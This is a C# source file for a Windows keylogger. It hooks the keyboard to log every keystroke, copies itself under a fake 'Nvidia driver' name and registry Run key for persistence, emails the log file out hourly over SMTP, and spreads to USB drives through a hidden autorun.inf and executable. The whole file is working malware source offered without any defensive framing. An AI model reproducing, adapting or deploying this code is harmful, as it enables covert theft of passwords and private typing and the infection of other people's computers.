using System;
using System.Diagnostics;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.Win32;

namespace Keylogger_V2
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static string logfile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");
        public static string fakefilename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdrv.exe");
        public static byte caps = 0, shift = 0, failed = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Program.startup();

            System.Timers.Timer mailtimer;
            mailtimer = new System.Timers.Timer();
            mailtimer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
            mailtimer.AutoReset = true;
            mailtimer.Interval = 1000 * 60 * 60; // Jede Stunde eine Mail senden
            mailtimer.Start();

            System.Timers.Timer usbtimer;
            usbtimer = new System.Timers.Timer();
            usbtimer.Elapsed += new ElapsedEventHandler(Program.USBSpread);
            usbtimer.AutoReset = true;
            usbtimer.Interval = 10000; // Alle 10 Sekunden die USB Ports prüfen
            usbtimer.Start();

            Application.Run();

            GC.KeepAlive(mailtimer);
            GC.KeepAlive(usbtimer);

            UnhookWindowsHookEx(_hookID);
        }

        public static void startup()
        {
            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            FileInfo aboutme = new FileInfo(me);

            Debug.WriteLine(destination + "\\" + aboutme.Name);
            if (File.Exists(destination + "\\" + aboutme.Name))
                Debug.WriteLine("Ist schon als Autostart drin");
            else
                File.Copy(me, destination + "\\" + aboutme.Name);

            if (File.Exists(fakefilename))
                Debug.WriteLine("Ist schon als Fake drin");
            else
                File.Copy(me, fakefilename);

            try
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (registryKey.GetValue("Nvidia driver") == null)
                {
                    registryKey.CreateSubKey("Nvidia driver");
                    registryKey.SetValue("Nvidia driver", fakefilename);
                }

                registryKey.Close();
            }
            catch (Exception e)
            {
                Debug.WriteLine("Error setting startup reg key for all users.");
            }
        }

        public static void OnTimedEvent(object source, EventArgs e)
        {
            MailMessage msg = new MailMessage();

            msg.To.Add("my@mail.com");
            msg.From = new MailAddress("from@mail.com", "Keylogger", System.Text.Encoding.UTF8);
            msg.Subject = "Logging";
            msg.SubjectEncoding = System.Text.Encoding.UTF8;
            msg.Body = "ciao ale";
            msg.BodyEncoding = System.Text.Encoding.UTF8;
            msg.IsBodyHtml = false;
            msg.Priority = MailPriority.High;

            SmtpClient client = new SmtpClient();
            client.Credentials = new NetworkCredential("my@mail.com", "mypassword");
            client.Port = 587;
            client.Host = "mail.server.com";
            client.EnableSsl = true;

            Attachment data = new Attachment(Program.logfile); // Log-Datei
            msg.Attachments.Add(data);

            try
            {
                client.Send(msg);
                failed = 0;
            }
            catch
            {
                data.Dispose();
                failed = 1;
            }
            data.Dispose();

            if (failed == 0)
                File.WriteAllText(Program.logfile, ""); // Log-Datei leeren

            failed = 0;
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                Debug.WriteLine(Program.logfile);
                StreamWriter sw = File.AppendText(logfile);
                int vkCode = Marshal.ReadInt32(lParam);
                if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;

                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        sw.Write("[SPACE]");
                        break;
                    case Keys.Return:
                        sw.WriteLine("[RETURN]");
                        break;
                    case Keys.Back:
                        sw.Write("[BACK]");
                        break;
                    case Keys.Tab:
                        sw.Write("[TAB]");
                        break;
                    case Keys.F1:
                        sw.Write("[F1]");
                        break;
                    case Keys.F2:
                        sw.Write("[F2]");
                        break;
                    case Keys.F3:
                        sw.Write("[F3]");
                        break;
                    case Keys.F4:
                        sw.Write("[F4]");
                        break;
                    case Keys.F5:
                        sw.Write("[F5]");
                        break;
                    case Keys.F6:
                        sw.Write("[F6]");
                        break;
                    case Keys.F7:
                        sw.Write("[F7]");
                        break;
                    case Keys.F8:
                        sw.Write("[F8]");
                        break;
                    case Keys.F9:
                        sw.Write("[F9]");
                        break;
                    case Keys.F10:
                        sw.Write("[F10]");
                        break;
                    case Keys.F11:
                        sw.Write("[F11]");
                        break;
                    case Keys.F12:
                        sw.Write("[F12]");
                        break;
                    case Keys.Up:
                        sw.Write("[ArrowUp]");
                        break;
                    case Keys.Down:
                        sw.Write("[ArrowDown]");
                        break;
                    case Keys.Left:
                        sw.Write("[ArrowLeft]");
                        break;
                    case Keys.Right:
                        sw.Write("[ArrowRight]");
                        break;
                    case Keys.Delete:
                        sw.Write("[DEL]");
                        break;
                    case Keys.Home:
                        sw.Write("[HOME]");
                        break;
                    case Keys.PrintScreen:
                        sw.Write("[PRINT]");
                        break;
                    case Keys.Scroll:
                        sw.Write("[SCROLL]");
                        break;
                    case Keys.NumLock:
                        sw.Write("[NUMLOCK]");
                        break;
                    case Keys.Insert:
                        sw.Write("[INSERT]");
                        break;
                    case Keys.End:
                        sw.Write("[END]");
                        break;
                    case Keys.PageUp:
                        sw.Write("[PageUp]");
                        break;
                    case Keys.VolumeDown:
                        sw.Write("[VolumeDown]");
                        break;
                    case Keys.VolumeUp:
                        sw.Write("[VolumeUp]");
                        break;
                    case Keys.VolumeMute:
                        sw.Write("[VolumeMute]");
                        break;
                case Keys.Next:
                        sw.Write("[NEXT]");
                        break;
                    case Keys.D0:
                        if (Program.shift == 0) sw.Write("0");
                        else sw.Write(")");
                        break;
                    case Keys.D1:
                        if (Program.shift == 0) sw.Write("1");
                        else sw.Write("!");
                        break;
                    case Keys.D2:
                        if (Program.shift == 0) sw.Write("2");
                        else sw.Write("@");
                        break;
                    case Keys.D3:
                        if (Program.shift == 0) sw.Write("3");
                        else sw.Write("#");
                        break;
                    case Keys.D4:
                        if (Program.shift == 0) sw.Write("4");
                        else sw.Write("$");
                        break;
                    case Keys.D5:
                        if (Program.shift == 0) sw.Write("5");
                        else sw.Write("%");
                        break;
                    case Keys.D6:
                        if (Program.shift == 0) sw.Write("6");
                        else sw.Write("^");
                        break;
                    case Keys.D7:
                        if (Program.shift == 0) sw.Write("7");
                        else sw.Write("&");
                        break;
                    case Keys.D8:
                        if (Program.shift == 0) sw.Write("8");
                        else sw.Write("*");
                        break;
                    case Keys.D9:
                        if (Program.shift == 0) sw.Write("9");
                        else sw.Write("(");
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                    case Keys.LMenu:
                    case Keys.RMenu:
                    case Keys.LWin:
                    case Keys.RWin:
                    case Keys.Apps:
                        sw.Write("");
                        break;
                    case Keys.OemQuestion:
                        if (Program.shift == 0) sw.Write("/");
                        else sw.Write("?");
                        break;
                    case Keys.OemOpenBrackets:
                        if (Program.shift == 0) sw.Write("[");
                        else sw.Write("{");
                        break;
                    case Keys.OemCloseBrackets:
                        if (Program.shift == 0) sw.Write("]");
                        else sw.Write("}");
                        break;
                    case Keys.Oem1:
                        if (Program.shift == 0) sw.Write(";");
                        else sw.Write(":");
                        break;
                    case Keys.Oem7:
                        if (Program.shift == 0) sw.Write("'");
                        else sw.Write('"');
                        break;
                    case Keys.Oemcomma:
                        if (Program.shift == 0) sw.Write(",");
                        else sw.Write("<");
                        break;
                    case Keys.OemPeriod:
                        if (Program.shift == 0) sw.Write(".");
                        else sw.Write(">");
                        break;
                    case Keys.OemMinus:
                        if (Program.shift == 0) sw.Write("-");
                        else sw.Write("_");
                        break;
                    case Keys.Oemplus:
                        if (Program.shift == 0) sw.Write("=");
                        else sw.Write("+");
                        break;
                    case Keys.Oemtilde:
                        if (Program.shift == 0) sw.Write("`");
                        else sw.Write("~");
                        break;
                    case Keys.Oem5:
                        sw.Write("|");
                        break;
                    case Keys.Capital:
                        if (Program.caps == 0) Program.caps = 1;
                        else Program.caps = 0;
                        break;
                    default:
                        if (Program.shift == 0 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                        if (Program.shift == 1 && Program.caps == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (Program.shift == 0 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        if (Program.shift == 1 && Program.caps == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                        break;
                }
                Program.shift = 0;
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        public static void USBSpread(object source, EventArgs e)
        {
            string src = Application.ExecutablePath.ToString();
            DriveInfo[] drives = DriveInfo.GetDrives();
            try
            {
                foreach (DriveInfo drive in drives)
                {
                    if (drive.DriveType == DriveType.Removable)
                    {
                        string driveAutorun = drive.Name + "autorun.inf";
                        StreamWriter sw = new StreamWriter(driveAutorun);
                        sw.WriteLine("[autorun]\n");
                        sw.WriteLine("open=start.exe");
                        sw.WriteLine("action=Run VMCLite");
                        sw.Close();
                        File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
                        try
                        {
                            File.Copy(src, drive.Name + "start.exe", true);
                            File.SetAttributes(drive.Name + "start.exe", File.GetAttributes(drive.Name + "start.exe") | FileAttributes.Hidden);
                        }
                        finally
                        {
                            Debug.WriteLine("Removable device rooted");
                        }
                    }
                }
            }
            catch (Exception e2)
            {
                Debug.WriteLine(e2.ToString());
            }
        }
    }
}